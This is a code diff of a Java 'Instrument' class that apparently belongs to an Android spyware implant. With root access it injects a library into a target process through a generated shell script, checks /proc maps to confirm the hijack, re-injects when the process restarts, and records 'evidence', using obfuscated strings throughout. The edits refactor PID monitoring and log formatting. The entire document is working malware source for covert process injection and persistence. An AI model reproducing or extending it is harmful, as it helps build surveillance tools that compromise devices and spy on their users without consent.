@@ -43,6 +43,7 @@ public class Instrument implements Runnable{
 	private Thread instSupervisor = null;
 	private ArrayList<String> argList = new ArrayList<String>();
 	private int timeout = 180;
+	private int pidInjected;
 
 
 	public Instrument(String process, String dump,Semaphore sem,String library,String owner) {
@@ -89,6 +90,11 @@ public class Instrument implements Runnable{
 		this.timeout = timeout;
 	}
 
+	/**
+	 * Return true if killed and istrumentation_failures don't exceed
+	 * MAX_KILLED limits
+	 * @return
+	 */
 	public boolean trialsBelowLimits(){
 		return killed<MAX_KILLED && istrumentation_failures<MAX_KILLED;
 	}
@@ -229,10 +235,11 @@ public class Instrument implements Runnable{
 					int pid = getProcessPid(proc, proc_owner);
 
 					if (pid > 0) {
+						this.pidInjected =pid;
 						// Run the injector
 						String scriptName = String.valueOf(Math.abs((int)Utils.getRandom()))+"ij";
 						String script = M.e("#!/system/bin/sh") + "\n";
-						script += M.e("rm ")+ getInstrumentationSuccessDir() +M.e("*.cnf") + M.e(" >/dev/null\n");
+						script += String.format(M.e("rm %s*.cnf >/dev/null"), getInstrumentationSuccessDir() ) + "\n";
 
 						String farg =" ";
 						if( !StringUtils.isEmpty(dumpPath)) {
@@ -305,8 +312,8 @@ public class Instrument implements Runnable{
 							if (Cfg.DEBUG) {
 								Check.log(TAG + " (_startInstrumentation) "+proc+" Hijack installed");
 							}
-							EvidenceBuilder.info(proc + M.e(" injected"));
-							checkProcessMonitor(true);
+							EvidenceBuilder.info(String.format(M.e("injection %s injected"), proc));
+							checkProcessMonitor();
 						}else if (trialsBelowLimits()) {
 							if (Cfg.DEBUG) {
 								Check.log(TAG + " (_startInstrumentation) Kill "+proc);
@@ -418,43 +425,36 @@ public class Instrument implements Runnable{
 		}
 	}
 
-	public void  checkProcessMonitor(boolean initialize) {
-		int newpid = 0;
+	public void  checkProcessMonitor() {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "(checkProcessMonitor): initialize " + initialize);
+			Check.log(TAG + "(checkProcessMonitor)");
 		}
-		if (initialize ) {
-			newpid = getProcessPid(proc, proc_owner);
-		}
+
 		if (pidMonitor == null) {
-			newpid = getProcessPid(proc, proc_owner);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(checkProcessMonitor): Starting "+proc+ " Monitor thread");
 			}
-			pidMonitor = new PidMonitor(newpid);
+			pidMonitor = new PidMonitor(pidInjected);
 			pidMonitorThread = new Thread(pidMonitor);
 			if (Cfg.DEBUG) {
 				pidMonitorThread.setName("pidMonitorThread");
 			}
 			pidMonitorThread.start();
 		} else {
-			if( initialize) {
-				pidMonitor.setPid(newpid);
-			}else{
-				if( pidMonitorThread != null && pidMonitorThread.getState() == Thread.State.TERMINATED ){
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(checkProcessMonitor): pidMonitorThread thread terminated ! restart a new one");
-					}
-					pidMonitor.setStopMonitor(false);
-					pidMonitor.setPid(newpid);
-					pidMonitorThread = new Thread(pidMonitor);
-					if (Cfg.DEBUG) {
-						pidMonitorThread.setName("pidMonitorThread");
-					}
-					pidMonitorThread.start();
-				}
+			if (pidMonitor.getPid() != pidInjected) {
+				pidMonitor.setPid(pidInjected);
 			}
-
+			if (pidMonitorThread != null && pidMonitorThread.getState() == Thread.State.TERMINATED) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(checkProcessMonitor): pidMonitorThread thread terminated ! restart a new one");
+				}
+				pidMonitor.setStopMonitor(false);
+				pidMonitorThread = new Thread(pidMonitor);
+				if (Cfg.DEBUG) {
+					pidMonitorThread.setName("pidMonitorThread");
+				}
+				pidMonitorThread.start();
+			}
 		}
 	}
 
@@ -518,12 +518,12 @@ public class Instrument implements Runnable{
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (stop): failed to stop thread"); //$NON-NLS-1$
 				}
-				EvidenceBuilder.info(M.e("Instrument "+ proc +" failed to stop"));
+				EvidenceBuilder.info(String.format(M.e("Instrument %s failed to stop"), proc));
 			}else{
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (stop): OK"); //$NON-NLS-1$
 				}
-				EvidenceBuilder.info(M.e("Instrument "+ proc + " correctly stopped"));
+				EvidenceBuilder.info(String.format(M.e("Instrument %s correctly stopped"), proc));
 
 			}
 		}
@@ -533,17 +533,17 @@ public class Instrument implements Runnable{
 		setThreadRunning(true);
 		while(instSupervisorContinue) {
 			if (Status.haveRoot()) {
-				if (! isStarted()) {
+				if (! isStarted() ) {
 					startInjection();
 				}else {
-					checkProcessMonitor(false);
+					checkProcessMonitor();
 				}
 			}
 			if(!trialsBelowLimits()){
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(run): too many kill stopping..");
-					instSupervisorContinue = false ;
 				}
+				instSupervisorContinue = false ;
 			}
 			Utils.sleep(5000);
 		}
@@ -621,7 +621,12 @@ public class Instrument implements Runnable{
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(startInjection): hijacker cannot be installed too many trials");
 			}
-			EvidenceBuilder.info(M.e("injection " + proc +" cannot be installed,too many trials"));
+			if(Cfg.DEMO) {
+			
+				Status.self().makeToast(String.format(M.e("injection %s cannot be installed,too many trials"), proc));
+			}
+			Log.d(TAG,String.format(M.e("injection %s cannot be installed,too many trials"), proc));
+			EvidenceBuilder.info(String.format(M.e("injection %s cannot be installed,too many trials"), proc));
 		}
 		return false;
 	}
@@ -630,13 +635,14 @@ public class Instrument implements Runnable{
 		int pid = getProcessPid(proc, proc_owner);
 		//read /proc/%pid/maps and checks for lib_dest process
 		Pattern pattern = Pattern.compile(lib_dest);
-		ExecuteResult ret = Execute.executeRoot(M.e("cat /proc/") + pid + "/" + M.e("maps "));
+
+		ExecuteResult ret = Execute.executeRoot(String.format(M.e("cat /proc/%s/maps "), pid));
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (alreadyInjected) " + proc + " output: ");
 		}
 		for (String s : ret.stdout) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " " + s);
+				//Check.log(TAG + " " + s);
 			}
 			Matcher matcher = pattern.matcher(s);
 			if (matcher.find()) {
@@ -664,6 +670,9 @@ public class Instrument implements Runnable{
 
 		public void setPid(int pid) {
 			start_pid = pid;
+		}
+		public int getPid() {
+			return start_pid;
 		}
 
 		public PidMonitor(int pid) {
@@ -701,7 +710,7 @@ public class Instrument implements Runnable{
 					}
 
 					failedCounter += 1;
-					if (failedCounter < MAX_KILLED) {
+					if (failedCounter < MAX_KILLED && trialsBelowLimits()) {
 						startInstrumentation();
 						restartedCounter++;
 					} else {
